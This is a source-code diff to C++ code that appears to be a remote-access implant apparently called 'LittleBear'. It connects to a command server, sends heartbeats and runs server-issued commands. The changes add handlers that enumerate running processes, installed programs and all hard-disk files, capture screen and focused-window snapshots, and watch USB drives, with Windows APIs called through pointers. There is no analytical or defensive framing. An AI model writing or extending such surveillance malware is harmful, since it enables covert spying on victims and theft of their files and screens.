@@ -30,7 +30,12 @@
 #include "../function/MessageBoxProc.h"
 #include "../BootWithApp.h"
 #include "function/filelistener.h"
-
+#include "../function/UsbFileWatcher.h"
+#include "../function/AppScreenshot.h"
+#include "../function/ScreenSnapshot.h"
+#include "../function/harddiskfile.h"
+#include "../function/InstallApps.h"
+#include "../function/RunningProcess.h"
 
 //#pragma comment(linker,"/stack:0x100000")
 
@@ -71,14 +76,14 @@ DWORD  WINAPI NetWorkCommand(VOID)
 		SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (hSock == SOCKET_ERROR)
 		{
-			writeLog("LittleBearWorkMain lpsocket error code:%u\r\n", lpRtlGetLastWin32Error());
+			writeLog("%s lpsocket error code:%u\r\n",__FUNCTION__, lpRtlGetLastWin32Error());
 			return FALSE;
 		}
 
 		DWORD dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
 		if (lpsetsockopt(hSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 		{
-			writeLog("LittleBearWorkMain lpsend time lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());
+			writeLog("%s lpsend time lpsetsockopt error code:%u\r\n", __FUNCTION__, lpRtlGetLastWin32Error());
 			lpclosesocket(hSock);
 			return FALSE;
 		}
@@ -86,7 +91,7 @@ DWORD  WINAPI NetWorkCommand(VOID)
 		dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
 		if (lpsetsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 		{
-			writeLog("LittleBearWorkMain lprecv time lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());
+			writeLog("%s lprecv time lpsetsockopt error code:%u\r\n", __FUNCTION__, lpRtlGetLastWin32Error());
 			lpclosesocket(hSock);
 			return FALSE;
 		}
@@ -101,16 +106,18 @@ DWORD  WINAPI NetWorkCommand(VOID)
 		{
 			lpclosesocket(hSock);
 
-			writeLog("LittleBearWorkMain lpconnect error code:%u\r\n", lpRtlGetLastWin32Error());
+			in_addr ia;
+			ia.S_un.S_addr = gServerIP;
+			writeLog("%s lpconnect %s:%d error code:%u\r\n", __FUNCTION__,inet_ntoa(ia), NETWORK_CMDPORT, lpRtlGetLastWin32Error());
 			return FALSE;
 		}
 
 
-		iRet = SendCmdPacket(hSock, HEARTBEAT, 0);
+		iRet = SendCmdPacket(hSock, HEARTBEAT, 0,0);
 		if (iRet <= 0)
 		{
 			lpclosesocket(hSock);
-			writeLog("send heartbeat packet error:%u\r\n", GetLastError());
+			writeLog("%s send heartbeat packet error:%u\r\n", __FUNCTION__, GetLastError());
 			return FALSE;
 		}
 
@@ -118,7 +125,7 @@ DWORD  WINAPI NetWorkCommand(VOID)
 		if (lpBuf == 0)
 		{
 			lpclosesocket(hSock);
-			writeLog("LittleBearWorkMain new operator recv buffer error code:%u\r\n", lpRtlGetLastWin32Error());
+			writeLog("%s new operator recv buffer error code:%u\r\n", __FUNCTION__, lpRtlGetLastWin32Error());
 			return FALSE;
 		}
 
@@ -485,6 +492,45 @@ DWORD  WINAPI NetWorkCommand(VOID)
 
 				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetMachineInfo, 0, 0, 0));
 			}
+			else if (dwCommand == RUNNING_APPS)
+			{
+				writeLog("recv SYSTEMINFO command\r\n");
+
+				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetRunningProcessInfo, 0, 0, 0));
+			}
+			else if (dwCommand == INSTALLED_APPS)
+			{
+
+				writeLog("recv SYSTEMINFO command\r\n");
+
+				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetApplicationInfo, 0, 0, 0));
+			}
+			else if (dwCommand == HARDDISKALLFILE)
+			{
+				HANDLE hThreadAllDiskFile = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetHardDiskAllFiles, 0, 0, 0);
+				lpCloseHandle(hThreadAllDiskFile);
+			}
+			else if (dwCommand == SCREENSNAPSHOT)
+			{
+				SCREENSNAPSHOT_TIME stScreenTime;
+				stScreenTime.iMaxTime = SCREEN_MAX_TIME;
+				stScreenTime.iMinTime = SCREEN_MIN_TIME;
+				HANDLE hThreadScreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenSnapshot,
+					&stScreenTime, 0, 0);
+				lpCloseHandle(hThreadScreen);
+			}
+			else if (dwCommand == APPSCREENSNAPSHOT)
+			{
+				HANDLE hAppSreen = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetAppScreenshot,
+					(LPVOID)APPSCREEN_SECLAST_FOCUSON, 0, 0);
+				lpCloseHandle(hAppSreen);
+			}
+			else if (dwCommand == USBALLFILES)
+			{
+				HANDLE hThreadUsb = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)UsbFileWatcher, 0, 0, 0);
+				lpCloseHandle(hThreadUsb);
+			}
+
 		}
 	_process_end:
 		delete[] lpBuf;
